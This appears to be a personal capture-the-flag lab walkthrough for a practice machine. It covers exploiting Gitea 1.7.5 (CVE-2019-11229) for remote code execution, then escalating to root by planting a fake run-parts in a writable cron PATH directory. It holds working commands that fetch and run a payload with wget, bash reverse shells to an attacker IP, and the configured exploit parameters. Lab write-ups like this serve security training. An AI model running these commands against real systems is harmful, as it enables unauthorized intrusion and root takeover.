#box

*Created: 1/11/2026*

### Step 1

**Tags:** #git #gitea #RCE

🔗 **URL/Link:** https://www.exploit-db.com/exploits/49383

**Command:**
```bash
python3 49383.py
```

*Port: 3000 | 💎 GEM*

> 
> In this first step of the machine we discover an instance of gitea version 1.7.5. This specific version is vulnerable to [CVE-2019-11229](https://www.exploit-db.com/exploits/49383)
> 
> This script requires an authenticated session. In our case we created a brand new account named `test:password123`.
> This particular exploit is not really well made, it actually is slightly confusing at first.
> In fact that exploit requirest 3 ports to be open on our end.
> The first one will host a git instance that will then push a git repository to the target machine on its port (in the case of that machine port 3000 and we'll open our git instance on port 3000 as well).
> Then he requires a web server to download the shell on the target machine (we couldn't achieve a reverse shell easily with a basic command, so we opted for the suggested command which performs a wget, changed the chmod of the given binary and finally executes the binary)
> Finally, the third port is gonna be the effective reverse shell listener.
> The final script parameters which we altered accordingly will look this way:
> 
```python
USERNAME = "test"
PASSWORD = "password123"
HOST_ADDR = '192.168.45.213' # Our machine
HOST_PORT = 3000 # Our port which will host the git instance
URL = 'http://192.168.200.67:3000' # Victim gitea instance location and port
CMD = 'busybox wget http://192.168.45.213:21/shell.sh -O /tmp/shell.sh; chmod 777 /tmp/shell.sh; /tmp/shell.sh
```
> 
> 
> Inside our `shell.sh` file, hosted on port 21 (thus will require a webserver running on port 21), the following shell will be present:
> 
```bash
#!/bin/bash
/bin/bash -i >& /dev/tcp/192.168.45.213/22 0>&1
```
> 
> Thus, a listener on port 22 is required to receive a connection.
> 
> Recap:
> 
> * Git instance used by the script: PORT 3000
> * Webserver: PORT 21
> * Netcat listener: PORT 22

---

### Step 2

**Tags:** #PATH-Abuse #cron #binaries #Reverse-Shell

🔗 **URL/Link:** https://hackfa.st/Offensive-Security/Linux-Environment/Privilege-Escalation/Service-Based/Cron-Jobs/Exploiting-Cron-PATH/

**Command:**
```bash
vim /usr/local/bin/run-parts

#!/bin/bash
/bin/sh -i >& /dev/tcp/192.168.45.213/21 0>&1

chmod +x /usr/local/bin/run-parts

# Wait 5 minutes . . .
```

> 
> Gaining a privilege escalation requires to use a PATH Abuse vulnerability. In fact, with `linpeas.sh` we discover that the folder `/usr/local/bin` is in the PATH variable and it's writeable by us. (further information in the notes)
> 
> The crontab file contains the following information:
> 
```bash
chloe@roquefort:/usr/local/bin$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
*/5 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
> From that file we notice that PATH contains `/usr/local.bin/` which is a writeable folder according to `linpeas.sh`. We can confirm that with `ls -la /usr/local/bin`, confirming that on top the current folder is writable by our user
> 
```bash
chloe@roquefort:/usr/local/bin$ ls -la
total 64156
drwxrwsrwx  2 root  staff     4096 Jan 11 10:45 . # <--- Permissions are "rWx" for our user
drwxrwsr-x 10 root  staff     4096 Apr 21  2020 ..
-rwxr-xr-x  1 root  staff 65299840 Mar  6  2020 gitea
-rwxr-xr-x  1 chloe staff       59 Jan 11 10:45 run-parts
-rwsr-xr-x  1 chloe staff   358624 Jan 11 09:22 ssh-agent
-rwsr-xr-x  1 chloe staff    15480 Jan 11 10:02 suid
-rwxr-xr-x  1 chloe staff       52 Jan 11 10:34 systemctl
```
> 
> To understand where run-parts is located, we can use the `which` command. In this case `which run-parts` will tell us that the binary is located in `/bin/run-parts`.
> 
> Since crontab's PATH is not necessarily equal to the shell's PATH, let's analyze crontab's PATH variable:
> 
> `PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
> 
> In this case, `/bin` is the third from the right. The priority is left to right and we notice that `/usr/local/bin` is in fronte of `/bin`. Putting a malicious binary called `run-parts` in our writable folder will anticipate the execution of the real `run-parts` binary in `/bin` and, instead, execute our one because it has a priority over the original one.
> 
> We then create a binary that grants us a reverse shell:
> 
```bash
vim /usr/local/bin/run-parts

#!/bin/bash
/bin/sh -i >& /dev/tcp/192.168.45.213/21 0>&1
```
> 
> Change its rights to make it executable with `chmod +x /usr/local/bin/run-parts` and wait the next 5 mins tick to receive a root shell.

---

